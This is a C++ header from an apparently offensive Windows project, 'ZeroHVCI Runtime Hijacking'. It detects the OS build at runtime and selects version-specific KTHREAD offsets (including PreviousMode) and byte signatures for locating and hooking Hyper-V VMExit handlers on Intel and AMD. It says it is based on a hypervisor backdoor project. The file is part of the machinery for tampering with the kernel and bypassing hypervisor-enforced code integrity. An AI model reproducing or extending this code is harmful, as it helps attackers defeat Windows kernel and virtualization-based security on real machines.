#pragma once
// Windows Version Detection System for ZeroHVCI Runtime Hijacking
// Provides runtime detection of Windows build number and selection of appropriate
// kernel structure offsets and VMExit handler signatures.

#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstdio>

namespace zerohvci {
namespace version {

// Windows version information structure
struct WindowsVersionInfo
{
    uint32_t MajorVersion;      // e.g., 10
    uint32_t MinorVersion;      // e.g., 0
    uint32_t BuildNumber;       // e.g., 22621
    uint32_t Revision;          // Update revision
    bool IsServer;              // Server vs Desktop
    bool IsIntel;               // CPU vendor (set externally)
};

// KTHREAD offset database entry
struct KThreadOffsets
{
    uint32_t MinBuild;
    uint32_t MaxBuild;
    uint32_t PreviousModeOffset;
    uint32_t StackBaseOffset;
    uint32_t KernelStackOffset;
    uint32_t StateOffset;
};

// VMExit signature database entry
struct VmExitSignature
{
    uint32_t MinBuild;
    uint32_t MaxBuild;
    bool IsIntel;
    uint8_t Pattern[32];
    uint8_t Mask[32];
    uint32_t PatternLen;
    uint32_t CallOffset;        // Static fallback offset (or 0 if using auto-discovery)
    uint32_t HookLen;
    bool IndirectContext;       // TRUE for builds >= 17763 (context is pointer-to-pointer)

    // Dynamic offset extraction fields (Option 1 - Hybrid approach)
    bool AutoDiscoverCall;      // If true, scan for E8 CALL after pattern match
    uint32_t ScanRangeStart;    // Start scanning at pattern_pos + ScanRangeStart
    uint32_t ScanRangeEnd;      // Stop scanning at pattern_pos + ScanRangeEnd
    uint8_t CallOpcode;         // Opcode to search for (0xE8 for near call)
};

// Global version info - populated by DetectWindowsVersion()
inline WindowsVersionInfo g_VersionInfo = { 0 };
inline bool g_VersionDetected = false;

//
// KTHREAD offset database
// Based on DmaBackdoorHv and internal analysis
//
inline const KThreadOffsets g_KThreadOffsets[] = {
    // Windows 10 1709 (RS3)
    { 16299, 16299, 0x232, 0x38, 0x58, 0x184 },

    // Windows 10 1803 (RS4)
    { 17134, 17134, 0x232, 0x38, 0x58, 0x184 },

    // Windows 10 1809 (RS5)
    { 17763, 17763, 0x232, 0x38, 0x58, 0x184 },

    // Windows 10 1903-1909 (19H1-19H2)
    { 18362, 18363, 0x232, 0x38, 0x58, 0x184 },

    // Windows 10 2004-21H1 (20H1-21H1)
    { 19041, 19043, 0x232, 0x38, 0x58, 0x184 },

    // Windows 10 21H2-22H2
    { 19044, 19045, 0x232, 0x38, 0x58, 0x184 },

    // Windows 11 21H2
    { 22000, 22000, 0x232, 0x38, 0x58, 0x184 },

    // Windows 11 22H2-23H2
    { 22621, 22631, 0x232, 0x38, 0x58, 0x184 },

    // Windows 11 24H2
    { 26100, 26200, 0x232, 0x38, 0x58, 0x184 },
};

#define KTHREAD_OFFSET_COUNT (sizeof(g_KThreadOffsets) / sizeof(g_KThreadOffsets[0]))

//
// VMExit handler signature database
// Intel signatures vary significantly per build
// AMD signatures are very stable
//

// Intel VMX signatures
// All Intel signatures use the same landmark pattern but with AUTO-DISCOVERY for CALL offset
// The pattern matches: gs:[0x6D] = 0, mov rcx/rdx from stack, call, jmp
// Auto-discovery scans forward to find the actual E8 CALL instruction
inline const VmExitSignature g_IntelSignatures[] = {
    // Windows 10 1709 (Build 16299) - Pre-IndirectContext era
    {
        16299, 17133, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25,         // PatternLen
        0x86,       // CallOffset (static fallback)
        5,          // HookLen
        false,      // IndirectContext = FALSE for pre-1809
        true,       // AutoDiscoverCall = TRUE (dynamic extraction)
        0x50,       // ScanRangeStart (scan from pattern+0x50)
        0x150,      // ScanRangeEnd (scan until pattern+0x150)
        0xE8        // CallOpcode (near call)
    },

    // Windows 10 1803 (Build 17134) - Pre-IndirectContext era
    {
        17134, 17762, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25, 0xD7, 5, false,
        true, 0x50, 0x150, 0xE8
    },

    // Windows 10 1809-1909 (Builds 17763-18363) - IndirectContext begins here
    {
        17763, 18363, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25, 0x11E, 8, true,  // IndirectContext = TRUE, HookLen = 8
        true, 0x80, 0x180, 0xE8
    },

    // Windows 10 2004-22H2 (Builds 19041-19045) - Covers 20H1, 20H2, 21H1, 21H2, 22H2
    {
        19041, 19045, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25, 0xCC, 5, true,
        true, 0x80, 0x150, 0xE8
    },

    // Windows 11 21H2-23H2 (Builds 22000-22631)
    {
        22000, 22999, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25, 0x10B, 5, true,
        true, 0x80, 0x150, 0xE8
    },

    // Windows 11 24H2+ (Build 26100 and future)
    {
        23000, 99999, true,
        { 0x65, 0xC6, 0x04, 0x25, 0x6D, 0x00, 0x00, 0x00, 0x00,
          0x48, 0x8B, 0x4C, 0x24, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x00,
          0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9 },
        { 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x',
          'x', 'x', 'x', 'x', '?', 'x', 'x', 'x', 'x', '?',
          'x', '?', '?', '?', '?', 'x' },
        25, 0x10B, 5, true,
        true, 0x80, 0x180, 0xE8  // Wider scan range for future builds
    },
};

#define INTEL_SIGNATURE_COUNT (sizeof(g_IntelSignatures) / sizeof(g_IntelSignatures[0]))

// AMD SVM signatures - very stable across versions
// AMD uses a universal pattern that works across all Windows 10/11 versions
// The CALL is at the START of the pattern, so no auto-discovery needed
inline const VmExitSignature g_AmdSignatures[] = {
    // Universal AMD pattern - works across all Windows 10/11 versions
    {
        16299, 99999, false,  // All versions
        { 0xE8, 0x00, 0x00, 0x00, 0x00,  // call vcpu_run
          0x48, 0x89, 0x04, 0x24,        // mov [rsp], rax
          0xE9 },                         // jmp
        { 'x', '?', '?', '?', '?',
          'x', 'x', 'x', 'x',
          'x' },
        10,         // PatternLen
        0,          // CallOffset (CALL is at pattern start)
        5,          // HookLen
        false,      // IndirectContext (AMD doesn't use this)
        false,      // AutoDiscoverCall = FALSE (CALL is directly in pattern)
        0, 0, 0     // No scan range needed (ScanRangeStart, ScanRangeEnd, CallOpcode)
    },
};

#define AMD_SIGNATURE_COUNT (sizeof(g_AmdSignatures) / sizeof(g_AmdSignatures[0]))

//
// RtlGetVersion function pointer type (ntdll export)
//
typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW);

//
// Detect Windows version at runtime
// Returns true if detection succeeded, populates g_VersionInfo
//
inline bool DetectWindowsVersion()
{
    if (g_VersionDetected)
        return true;

    // Use RtlGetVersion - it's not subject to application compatibility shims
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
    {
        printf("[-] Failed to get ntdll.dll handle\n");
        return false;
    }

    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion)
    {
        printf("[-] Failed to get RtlGetVersion address\n");
        return false;
    }

    RTL_OSVERSIONINFOW osvi = { 0 };
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    NTSTATUS status = pRtlGetVersion(&osvi);
    if (status != 0)
    {
        printf("[-] RtlGetVersion failed: 0x%08X\n", status);
        return false;
    }

    g_VersionInfo.MajorVersion = osvi.dwMajorVersion;
    g_VersionInfo.MinorVersion = osvi.dwMinorVersion;
    g_VersionInfo.BuildNumber = osvi.dwBuildNumber;
    g_VersionInfo.Revision = 0;  // Would need registry query for UBR
    g_VersionInfo.IsServer = false;  // Could check ProductType

    g_VersionDetected = true;

    printf("[+] Detected Windows %u.%u Build %u\n",
        g_VersionInfo.MajorVersion,
        g_VersionInfo.MinorVersion,
        g_VersionInfo.BuildNumber);

    return true;
}

//
// Get the current Windows build number
//
inline uint32_t GetBuildNumber()
{
    if (!g_VersionDetected)
    {
        if (!DetectWindowsVersion())
        {
            // Fallback to Windows 11 22H2 as default
            printf("[!] Using default build 22621\n");
            return 22621;
        }
    }
    return g_VersionInfo.BuildNumber;
}

//
// Find KTHREAD offsets for current/specified build
//
inline const KThreadOffsets* GetKThreadOffsets(uint32_t buildNumber = 0)
{
    if (buildNumber == 0)
        buildNumber = GetBuildNumber();

    for (size_t i = 0; i < KTHREAD_OFFSET_COUNT; i++)
    {
        if (buildNumber >= g_KThreadOffsets[i].MinBuild &&
            buildNumber <= g_KThreadOffsets[i].MaxBuild)
        {
            return &g_KThreadOffsets[i];
        }
    }

    // Unknown version - return most recent entry as fallback
    printf("[!] Unknown build %u, using fallback offsets\n", buildNumber);
    return &g_KThreadOffsets[KTHREAD_OFFSET_COUNT - 1];
}

//
// Get KTHREAD->PreviousMode offset for current build
//
inline uint32_t GetKThreadPreviousModeOffset()
{
    const KThreadOffsets* offsets = GetKThreadOffsets();
    return offsets ? offsets->PreviousModeOffset : 0x232;  // Default fallback
}

//
// Get KTHREAD->StackBase offset for current build
//
inline uint32_t GetKThreadStackBaseOffset()
{
    const KThreadOffsets* offsets = GetKThreadOffsets();
    return offsets ? offsets->StackBaseOffset : 0x38;
}

//
// Get KTHREAD->KernelStack offset for current build
//
inline uint32_t GetKThreadKernelStackOffset()
{
    const KThreadOffsets* offsets = GetKThreadOffsets();
    return offsets ? offsets->KernelStackOffset : 0x58;
}

//
// Find VMExit signature for specified build and CPU vendor
//
inline const VmExitSignature* FindVmExitSignature(uint32_t buildNumber, bool isIntel)
{
    if (isIntel)
    {
        for (size_t i = 0; i < INTEL_SIGNATURE_COUNT; i++)
        {
            if (buildNumber >= g_IntelSignatures[i].MinBuild &&
                buildNumber <= g_IntelSignatures[i].MaxBuild)
            {
                return &g_IntelSignatures[i];
            }
        }
    }
    else
    {
        // AMD - use universal signature
        for (size_t i = 0; i < AMD_SIGNATURE_COUNT; i++)
        {
            if (buildNumber >= g_AmdSignatures[i].MinBuild &&
                buildNumber <= g_AmdSignatures[i].MaxBuild)
            {
                return &g_AmdSignatures[i];
            }
        }
    }

    printf("[!] No signature found for build %u (%s)\n",
        buildNumber, isIntel ? "Intel" : "AMD");
    return nullptr;
}

//
// Check if build requires indirect context (pointer-to-pointer for guest state)
//
inline bool RequiresIndirectContext(uint32_t buildNumber = 0)
{
    if (buildNumber == 0)
        buildNumber = GetBuildNumber();

    // Build 17763 (1809) and later use indirect context
    return buildNumber >= 17763;
}

//
// Get friendly Windows version name
//
inline const char* GetVersionName(uint32_t buildNumber = 0)
{
    if (buildNumber == 0)
        buildNumber = GetBuildNumber();

    if (buildNumber >= 26100) return "Windows 11 24H2";
    if (buildNumber >= 22631) return "Windows 11 23H2";
    if (buildNumber >= 22621) return "Windows 11 22H2";
    if (buildNumber >= 22000) return "Windows 11 21H2";
    if (buildNumber >= 19045) return "Windows 10 22H2";
    if (buildNumber >= 19044) return "Windows 10 21H2";
    if (buildNumber >= 19043) return "Windows 10 21H1";
    if (buildNumber >= 19042) return "Windows 10 20H2";
    if (buildNumber >= 19041) return "Windows 10 2004";
    if (buildNumber >= 18363) return "Windows 10 1909";
    if (buildNumber >= 18362) return "Windows 10 1903";
    if (buildNumber >= 17763) return "Windows 10 1809";
    if (buildNumber >= 17134) return "Windows 10 1803";
    if (buildNumber >= 16299) return "Windows 10 1709";

    return "Unknown Windows Version";
}

//
// Print version detection summary
//
inline void PrintVersionInfo()
{
    if (!g_VersionDetected)
        DetectWindowsVersion();

    printf("\n========================================\n");
    printf("  Windows Version Detection\n");
    printf("========================================\n");
    printf("Version:     %s\n", GetVersionName());
    printf("Build:       %u\n", g_VersionInfo.BuildNumber);
    printf("Major.Minor: %u.%u\n", g_VersionInfo.MajorVersion, g_VersionInfo.MinorVersion);
    printf("Indirect Ctx: %s\n", RequiresIndirectContext() ? "Yes" : "No");

    const KThreadOffsets* offsets = GetKThreadOffsets();
    if (offsets)
    {
        printf("\nKTHREAD Offsets:\n");
        printf("  PreviousMode: 0x%03X\n", offsets->PreviousModeOffset);
        printf("  StackBase:    0x%03X\n", offsets->StackBaseOffset);
        printf("  KernelStack:  0x%03X\n", offsets->KernelStackOffset);
    }
    printf("========================================\n\n");
}

} // namespace version
} // namespace zerohvci
